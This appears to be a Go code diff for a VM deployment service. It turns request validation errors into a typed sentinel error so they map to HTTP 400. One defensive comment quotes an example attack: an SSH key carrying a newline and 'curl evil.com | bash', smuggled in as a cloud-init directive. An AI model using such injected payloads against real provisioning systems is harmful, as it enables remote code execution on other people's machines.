@@ -1,6 +1,7 @@
 package service
 
 import (
+	"errors"
 	"context"
 	"encoding/json"
 	"fmt"
@@ -105,37 +106,53 @@ type DeployResponse struct {
 }
 
 // V3-H11: Validate deployment request fields
+// ErrInvalidDeployRequest marks a request the caller got wrong (missing or
+// out-of-range fields). Handlers map it to 400; everything else from Start is
+// a server-side failure.
+var ErrInvalidDeployRequest = errors.New("invalid deploy request")
+
+// deployRequestError keeps the exact validation message as Error() (Preflight
+// shows it verbatim as a blocker) while matching ErrInvalidDeployRequest.
+type deployRequestError struct{ msg string }
+
+func (e *deployRequestError) Error() string          { return e.msg }
+func (e *deployRequestError) Is(target error) bool { return target == ErrInvalidDeployRequest }
+
+func invalidDeploy(format string, args ...interface{}) error {
+	return &deployRequestError{msg: fmt.Sprintf(format, args...)}
+}
+
 func validateDeployRequest(req *DeployRequest) error {
 	if len(req.VMName) > 64 || !validVMName.MatchString(req.VMName) {
-		return fmt.Errorf("invalid VM name: must be 1-64 alphanumeric characters with dashes, dots, or underscores")
+		return invalidDeploy("invalid VM name: must be 1-64 alphanumeric characters with dashes, dots, or underscores")
 	}
 	if req.CPU < 1 || req.CPU > 128 {
-		return fmt.Errorf("CPU must be between 1 and 128")
+		return invalidDeploy("CPU must be between 1 and 128")
 	}
 	if req.MemoryMB < 256 || req.MemoryMB > 1048576 {
-		return fmt.Errorf("memory must be between 256MB and 1TB")
+		return invalidDeploy("memory must be between 256MB and 1TB")
 	}
 	if req.DiskGB != 0 && (req.DiskGB < 1 || req.DiskGB > 65536) {
-		return fmt.Errorf("disk must be between 1GB and 64TB")
+		return invalidDeploy("disk must be between 1GB and 64TB")
 	}
 	if req.VLANTag != 0 && (req.VLANTag < 1 || req.VLANTag > 4094) {
-		return fmt.Errorf("VLAN tag must be between 1 and 4094")
+		return invalidDeploy("VLAN tag must be between 1 and 4094")
 	}
 	if req.IPAddress != "" && net.ParseIP(req.IPAddress) == nil {
-		return fmt.Errorf("invalid IP address")
+		return invalidDeploy("invalid IP address")
 	}
 	if req.Netmask != "" && net.ParseIP(req.Netmask) == nil {
-		return fmt.Errorf("invalid netmask address")
+		return invalidDeploy("invalid netmask address")
 	}
 	if req.Gateway != "" && net.ParseIP(req.Gateway) == nil {
-		return fmt.Errorf("invalid gateway address")
+		return invalidDeploy("invalid gateway address")
 	}
 	if len(req.DNS) > 10 {
-		return fmt.Errorf("DNS list exceeds maximum of 10 entries")
+		return invalidDeploy("DNS list exceeds maximum of 10 entries")
 	}
 	for _, dns := range req.DNS {
 		if net.ParseIP(dns) == nil {
-			return fmt.Errorf("invalid DNS address: %s", dns)
+			return invalidDeploy("invalid DNS address: %s", dns)
 		}
 	}
 	if req.SSHPublicKey != "" {
@@ -144,11 +161,11 @@ func validateDeployRequest(req *DeployRequest) error {
 		// An attacker could craft a key like "ssh-rsa AAAA...\nruncmd:\n  - curl evil.com | bash"
 		// to break out of ssh_authorized_keys and inject arbitrary cloud-init directives.
 		if strings.ContainsAny(key, "\n\r") {
-			return fmt.Errorf("invalid SSH public key: must not contain newlines")
+			return invalidDeploy("invalid SSH public key: must not contain newlines")
 		}
 		if !strings.HasPrefix(key, "ssh-rsa ") && !strings.HasPrefix(key, "ssh-ed25519 ") &&
 			!strings.HasPrefix(key, "ecdsa-sha2-") && !strings.HasPrefix(key, "ssh-dss ") {
-			return fmt.Errorf("invalid SSH public key: must start with ssh-rsa, ssh-ed25519, ecdsa-sha2-, or ssh-dss")
+			return invalidDeploy("invalid SSH public key: must start with ssh-rsa, ssh-ed25519, ecdsa-sha2-, or ssh-dss")
 		}
 	}
 	return nil
